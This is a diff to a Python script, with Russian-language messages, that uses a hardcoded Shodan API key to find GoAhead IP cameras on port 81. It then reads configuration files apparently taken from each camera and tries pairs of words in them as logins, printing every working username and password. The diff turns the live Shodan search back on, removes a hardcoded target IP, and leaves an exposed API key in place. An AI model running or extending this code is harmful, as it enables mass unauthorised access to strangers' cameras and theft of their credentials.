@@ -4,8 +4,6 @@ from requests import session
 from colorama import init, Fore, Back
 from progress.bar import IncrementalBar
 
-os.system('cls || clear')
-          
 try:
  mess = urllib.request.urlopen('https://raw.githubusercontent.com/Max412/cam/main/user.txt').read().decode('utf8')
 except urllib.error.URLError:
@@ -40,26 +38,26 @@ key = '9r6vVczYqYGR9F3WADASttMPt6fqK2Mm' #9r6vVczYqYGR9F3WADASttMPt6fqK2Mm
 
 api = shodan.Shodan(key)
 
-num_of_vulnerable = ['187.39.115.243']
+num_of_vulnerable = []
 locations = []
-ips = ['187.39.115.243']
+ips = []
 
 def st():
 
- # try:
- #  results = api.search('realm="GoAhead", domain=":81"')
- # except shodan.exception.APIError:
- #  #os.remove(r'C:\Windows\Temp\te.config')
- #  input('Неправильный ключ API!\nПерезапустите программу и введите корректный API.')
- #  exit()
+ try:
+  results = api.search('realm="GoAhead", domain=":81"')
+ except shodan.exception.APIError:
+  #os.remove(r'C:\Windows\Temp\te.config')
+  input('Неправильный ключ API!\nПерезапустите программу и введите корректный API.')
+  exit()
  
- # #ips.clear()
- # for result in results['matches']:
- #  ips.append(format(result['ip_str']))
- #  # with open('assad.txt', 'a+') as e:
- #  #   e.write(format(result['ip_str'])+'\n')
- #  ka = result['location']
- #  locations.append(f"{format(ka['city'])}, {format(ka['country_name'])}")
+ #ips.clear()
+ for result in results['matches']:
+  ips.append(format(result['ip_str']))
+  # with open('assad.txt', 'a+') as e:
+  #   e.write(format(result['ip_str'])+'\n')
+  ka = result['location']
+  locations.append(f"{format(ka['city'])}, {format(ka['country_name'])}")
 
  for ip in ips:
   try:
@@ -98,10 +96,10 @@ with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
    try:
     user = None
     password = None
-    file = open(f'camera_{ipi}.ini', 'r')
+    file = open(f'camera_{ipi}.ini', 'r', encoding='latin-1')
 
     try:
-     data = file.read().replace('\x00', ' ').replace('^@', ' ')
+     data = file.read().replace('\x00', ' ')
      words = data.split()
     except Exception as r:
      print(r)
@@ -115,7 +113,7 @@ with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
       if page.status_code == 200:
        #user = words[i]
        #password = words[i+1]
-       print(f'\nSuccess: {ipi}, {words[i]}:{words[i+1]}')
+       print(f'\nSuccess: {ipi} | {words[i]}:{words[i+1]}')
        raz += 1
        bar.next()
        break
